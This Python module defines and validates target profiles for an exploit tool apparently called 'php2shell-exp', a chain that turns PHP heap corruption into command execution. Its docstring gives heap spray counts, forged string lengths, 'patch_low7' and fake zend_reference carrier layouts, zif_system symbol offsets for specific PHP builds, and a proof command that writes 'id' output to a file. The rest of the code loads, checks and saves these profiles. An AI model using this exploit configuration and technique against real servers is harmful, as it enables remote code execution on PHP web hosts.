#!/usr/bin/env python3
"""Profile JSON schema for php2shell-exp.

A profile is the complete, measured description of one target build. Nothing
in chain.py may hardcode heap geometry, carrier layout, spray counts or pads:
those live here (or in docker/ini/<target>.ini) and are produced by
`chain.py calibrate`.

Schema (schema=1):

{
  "schema": 1,
  "target": "8.4.26",                 # also the profile file stem
  "image": "php:8.4.26-apache",
  "container": "php2shell-exp-8426",
  "url": "http://127.0.0.1:19126/index.php",
  "libphp": "/usr/lib/apache2/modules/libphp.so",
  "symbols": {"zif_system": 0x465370, "zval_ptr_dtor": 0x65eb60},
  "symbols_sha256": "<sha256 of libphp.so used for measurement>",
  "limits": {"memory_limit": "8M", "post_max_size": "64M",
             "max_input_vars": 1000},
  "heap": {
    "chunk_align": 2097152,           # 2 MiB Zend MM chunk
    "pointer_lo": 0x7f0000000000,     # userspace pointer range used by leaks
    "pointer_hi": 0x800000000000,
    "stage1": {"fillers": 841, "value_len": 48, "forge_len": 79,
               "forge_len_field": 0x1000},
    "stage2": {"groups": 983, "target": 406, "target_count": 16,
               "value_len": 16},
    "htdata_offset": 0x690d8          # chunk-relative 167-byte live string
  },
  "stage3": {
    "pads": [[31, 31], ...],          # arm-request pad fields [name_len, val_len]
    "carrier": {"kind": "patch_low7", "len": 15, "count": 2},
    "spray": {"count": 15, "name_len": 31, "value_len": 167},
    "arm_cookie": true,               # send a valid Cookie: PHPSESSID=<32 chars>
    "big_mb": 12,                     # OOM field size, > memory_limit
    "sid_len": 19,
    "progress_len": 3
  },
  "proof": {"cmd": "id>/out/p1", "file": "/out/p1"},
  "calibration": {                    # provenance written by calibrate
    "generated_by": "chain.py calibrate",
    "timestamp": "...",
    "oracles": {...}
  }
}

carrier.kind values:
  patch_low7    8.4.26 bookworm: 15-byte field value whose data lands on R0;
                rewrites gc + low 7 bytes of the live reference's val.value.
  live_reference 8.5.11 (dinosn): 31-byte field value whose data lands on the
                freed reference at R0; carries a complete fake zend_reference.
"""

from __future__ import annotations

import json
import os
from datetime import datetime, timezone

SCHEMA = 1
REPO = os.path.dirname(os.path.abspath(__file__))
PROFILE_DIR = os.path.join(REPO, "profiles")

CARRIER_KINDS = ("patch_low7", "live_reference")


def profile_path(target: str, directory: str = PROFILE_DIR) -> str:
    return os.path.join(directory, f"{target}.json")


def load(target: str, directory: str = PROFILE_DIR) -> dict:
    path = profile_path(target, directory)
    if not os.path.exists(path):
        raise SystemExit(f"no profile for {target}: {path} (run: chain.py calibrate --target {target})")
    with open(path, "r", encoding="utf-8") as f:
        data = json.load(f)
    errors = validate(data)
    if errors:
        raise SystemExit(f"invalid profile {path}:\n  " + "\n  ".join(errors))
    return data


def save(data: dict, directory: str = PROFILE_DIR) -> str:
    path = profile_path(data["target"], directory)
    os.makedirs(directory, exist_ok=True)
    data = dict(data)
    data.setdefault("calibration", {})
    data["calibration"]["generated_by"] = "chain.py calibrate"
    data["calibration"]["timestamp"] = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    errors = validate(data)
    if errors:
        raise SystemExit("refusing to write invalid profile:\n  " + "\n  ".join(errors))
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, sort_keys=False)
        f.write("\n")
    return path


def _need(obj: dict, key: str, errors: list[str], where: str) -> bool:
    if key not in obj:
        errors.append(f"missing {where}{key}")
        return False
    return True


def validate(data: dict) -> list[str]:
    errors: list[str] = []
    if data.get("schema") != SCHEMA:
        errors.append(f"schema must be {SCHEMA}, got {data.get('schema')!r}")
    for key in ("target", "image", "container", "url", "libphp", "symbols",
                "limits", "heap", "stage3", "proof"):
        _need(data, key, errors, "")
    if errors:
        return errors

    heap = data["heap"]
    for key in ("chunk_align", "pointer_lo", "pointer_hi", "stage1",
                "stage2", "htdata_offset"):
        _need(heap, key, errors, "heap.")
    if not errors:
        s1, s2 = heap["stage1"], heap["stage2"]
        for key in ("fillers", "value_len", "forge_len", "forge_len_field"):
            _need(s1, key, errors, "heap.stage1.")
        for key in ("groups", "target", "target_count", "value_len"):
            _need(s2, key, errors, "heap.stage2.")

    st3 = data["stage3"]
    for key in ("pads", "carrier", "spray", "big_mb"):
        _need(st3, key, errors, "stage3.")
    if "carrier" in st3:
        kind = st3["carrier"].get("kind")
        if kind not in CARRIER_KINDS:
            errors.append(f"stage3.carrier.kind must be one of {CARRIER_KINDS}, got {kind!r}")
        for key in ("len", "count"):
            _need(st3["carrier"], key, errors, "stage3.carrier.")
    if "spray" in st3:
        for key in ("count", "name_len", "value_len"):
            _need(st3["spray"], key, errors, "stage3.spray.")
    if "pads" in st3:
        try:
            for spec in st3["pads"]:
                if not (isinstance(spec, (list, tuple)) and len(spec) == 2):
                    errors.append(f"stage3.pads entries must be [name_len, val_len]: {spec!r}")
                    break
        except TypeError:
            errors.append("stage3.pads must be a list of [name_len, val_len]")

    for key in ("zif_system", "zval_ptr_dtor"):
        if key not in data["symbols"]:
            errors.append(f"symbols.{key} missing (resolved by name at calibrate time)")
    for key in ("cmd",):
        _need(data["proof"], key, errors, "proof.")
    return errors


def describe(data: dict) -> str:
    c = data["stage3"]["carrier"]
    return (
        f"{data['target']} image={data['image']} htdata=+0x{data['heap']['htdata_offset']:x} "
        f"stage1={data['heap']['stage1']['fillers']} "
        f"stage2={data['heap']['stage2']['target']}/{data['heap']['stage2']['value_len']} "
        f"pads={len(data['stage3']['pads'])} carrier={c['kind']}x{c['count']} "
        f"spray={data['stage3']['spray']['count']}"
    )
